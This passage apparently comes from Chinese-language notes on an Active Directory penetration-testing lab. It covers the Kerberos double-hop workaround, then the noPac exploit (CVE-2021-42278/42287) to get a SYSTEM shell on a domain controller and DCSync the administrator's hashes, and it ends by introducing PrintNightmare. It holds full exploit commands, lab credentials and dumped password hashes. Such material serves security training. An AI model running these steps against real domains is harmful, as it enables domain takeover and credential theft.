<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> <span class="literal">-credential</span> <span class="variable">$Cred</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure>

<p>如果我们通过 RDP 连接到同一主机，打开 CMD 命令提示符并输入 <code>klist</code> ，我们会看到已缓存了必要的票据，可以直接与域控制器交互，而无需担心双跳问题。这是因为我们的密码存储在内存中，因此可以随每个请求一起发送。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">htb</span>&gt; <span class="title">klist</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Current</span> <span class="title">LogonId</span> <span class="title">is</span> 0:0<span class="title">x1e5b8b</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Cached</span> <span class="title">Tickets</span>: (4)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#0&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x60a10000</span> -&gt; <span class="title">forwardable</span> <span class="title">forwarded</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x2</span> -&gt; <span class="title">DELEGATION</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#1&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40e10000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">initial</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x1</span> -&gt; <span class="title">PRIMARY</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#2&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">ProtectedStorage</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#3&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">cifs</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br></pre></td></tr></table></figure>

<h4 id="注册-PSSession-配置"><a href="#注册-PSSession-配置" class="headerlink" title="注册 PSSession 配置"></a>注册 PSSession 配置</h4><p><strong>建立一个 WinRM 会话</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="literal">-Credential</span> inlanefreight\backupadm</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">ACADEMY</span>-<span class="type">AEN</span>-<span class="type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x11e387</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">       Server: HTTP/ACADEMY<span class="literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">       KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Ticket Flags <span class="number">0</span>x40a10000 -&gt; forwardable renewable pre_authent name_canonicalize</span><br><span class="line">       <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">9</span>:<span class="number">09</span>:<span class="number">19</span> (local)</span><br><span class="line">       <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">19</span>:<span class="number">09</span>:<span class="number">19</span> (local)</span><br><span class="line">       Renew Time: <span class="number">0</span></span><br><span class="line">       Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Cache Flags: <span class="number">0</span>x8 -&gt; ASC</span><br><span class="line">       Kdc Called:</span><br></pre></td></tr></table></figure>

<p><strong>也不能直接使用 PowerView 与域控制器进行交互</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">ACADEMY</span>-<span class="type">AEN</span>-<span class="type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">AEN</span>-<span class="type">DEV01.INLANEFREIGHT.LOCAL</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">Exception calling <span class="string">&quot;FindAll&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An operations error occurred.</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">At C:\Users\backupadm\Documents\PowerView.ps1:<span class="number">5253</span> char:<span class="number">20</span></span><br><span class="line">+             <span class="keyword">else</span> &#123; <span class="variable">$Results</span> = <span class="variable">$UserSearcher</span>.FindAll() &#125;</span><br><span class="line">+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class="line">   + FullyQualifiedErrorId : DirectoryServicesCOMException</span><br></pre></td></tr></table></figure>

<p><strong>使用 <code>Register-PSSessionConfiguration</code> cmdlet 注册一个新的会话配置</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Register-PSSessionConfiguration</span> <span class="literal">-Name</span> backupadmsess <span class="literal">-RunAsCredential</span> inlanefreight\backupadm</span><br><span class="line"></span><br><span class="line"> WARNING: When RunAs is enabled <span class="keyword">in</span> a Windows PowerShell session configuration, the Windows security model cannot enforce</span><br><span class="line"> a security boundary between different user sessions that are created by <span class="keyword">using</span> this endpoint. Verify that the Windows</span><br><span class="line">PowerShell runspace configuration is restricted to only the necessary <span class="built_in">set</span> of cmdlets and capabilities.</span><br><span class="line">WARNING: <span class="built_in">Register-PSSessionConfiguration</span> may need to restart the WinRM service <span class="keyword">if</span> a configuration <span class="keyword">using</span> this name has</span><br><span class="line">recently been unregistered, certain system <span class="keyword">data</span> structures may still be cached. <span class="keyword">In</span> that case, a restart of WinRM may be</span><br><span class="line"> required.</span><br><span class="line">All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session</span><br><span class="line">configurations that are created with the <span class="built_in">Register-PSSessionConfiguration</span> cmdlet, are disconnected.</span><br><span class="line"></span><br><span class="line">   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin</span><br><span class="line"></span><br><span class="line"><span class="built_in">Type</span>            Keys                                Name</span><br><span class="line"><span class="literal">----</span>            <span class="literal">----</span>                                <span class="literal">----</span></span><br><span class="line">Container       &#123;Name=backupadmsess&#125;                backupadmsess</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DEV01 <span class="literal">-Credential</span> INLANEFREIGHT\backupadm <span class="literal">-ConfigurationName</span>  backupadmsess</span><br><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x2239ba</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">       Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">       KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">       <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">23</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">       Kdc Called: DC01</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\Public&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure>

<h2 id="前沿漏洞"><a href="#前沿漏洞" class="headerlink" title="前沿漏洞"></a>前沿漏洞</h2><h3 id="NoPac-SamAccountName-Spoofing"><a href="#NoPac-SamAccountName-Spoofing" class="headerlink" title="NoPac (SamAccountName Spoofing)"></a>NoPac (SamAccountName Spoofing)</h3><p>一个新兴威胁的典型例子是 Sam_The_Admin 漏洞，也被称为 <code>noPac</code> 或 <code>SamAccountName Spoofing</code> ，于 2021 年底发布。该漏洞涉及两个 CVE：2021-42278 和 2021-42287，允许在单个命令内实现从任何标准域用户到域管理员级别的跨域权限提升。以下是关于此漏洞每个 CVE 提供的简要分析。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ git <span class="built_in">clone</span> https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                           </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484</span><br><span class="line">[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                               </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Adding Computer Account <span class="string">&quot;WIN-LWJFQMAXRVN$&quot;</span></span><br><span class="line">[*] MachineAccount <span class="string">&quot;WIN-LWJFQMAXRVN$&quot;</span> password = &amp;A<span class="comment">#x8X^5iLva</span></span><br><span class="line">[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A<span class="comment">#x8X^5iLva.</span></span><br><span class="line">[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> ACADEMY-EA-DC01.ccache</span><br><span class="line">[*] Resting the machine account to WIN-LWJFQMAXRVN$</span><br><span class="line">[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value</span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] 	Requesting S4U2self</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br><span class="line">[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Rename ccache with target ...</span><br><span class="line">[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$</span><br><span class="line">[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils</span><br><span class="line">README.md  scanner.py</span><br></pre></td></tr></table></figure>

<h3 id="使用-noPac-对内置管理员账户进行-DCSync"><a href="#使用-noPac-对内置管理员账户进行-DCSync" class="headerlink" title="使用 noPac 对内置管理员账户进行 DCSync"></a>使用 noPac 对内置管理员账户进行 DCSync</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c2tt@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket <span class="keyword">for</span> target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h2 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p><code>PrintNightmare</code> 是针对两个漏洞（CVE-2021-34527 和 CVE-2021-1675）的昵称，这些漏洞存在于所有 Windows 操作系统上运行的打印后台处理程序服务中。基于这些漏洞，已编写了许多允许权限提升和远程代码执行的利用程序。在 Windows 权限提升模块中涵盖了利用此漏洞进行本地权限提升的内容，但在 Active Directory 环境中练习以获取对主机的远程访问同样重要。让我们通过一个可以让我们在运行于 Windows Server 2019 主机上的域控制器上获得 SYSTEM 会话的漏洞利用来实践一下。</p>
